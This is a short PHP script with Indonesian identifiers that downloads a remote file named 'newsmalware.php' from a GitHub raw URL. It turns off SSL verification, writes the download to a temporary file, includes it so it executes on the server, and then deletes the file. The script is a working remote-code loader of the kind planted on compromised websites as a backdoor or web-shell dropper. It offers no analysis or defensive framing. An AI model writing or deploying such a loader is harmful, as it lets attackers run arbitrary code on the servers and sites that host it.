ops<?php
function ambil_konten($url) {
    $konten = @file_get_contents($url);
    if ($konten !== false) return $konten;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $konten = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode !== 200 || empty($konten)) return false;
    return $konten;
}

$url = "https://raw.githubusercontent.com/ressasantikaa-rgb/newphp86/main/newsmalware.php";
$konten = ambil_konten($url);

if ($konten === false) {
    die("Gagal mengambil data dari URL.");
}

try {
    ob_start();
    $tmp = tempnam(sys_get_temp_dir(), "kode_");
    file_put_contents($tmp, $konten);
    include $tmp;
    unlink($tmp);
    ob_end_flush();
} catch (Throwable $e) {
    ob_end_clean();
    die("Terjadi kesalahan saat eksekusi kode: " . $e->getMessage());
}
?>
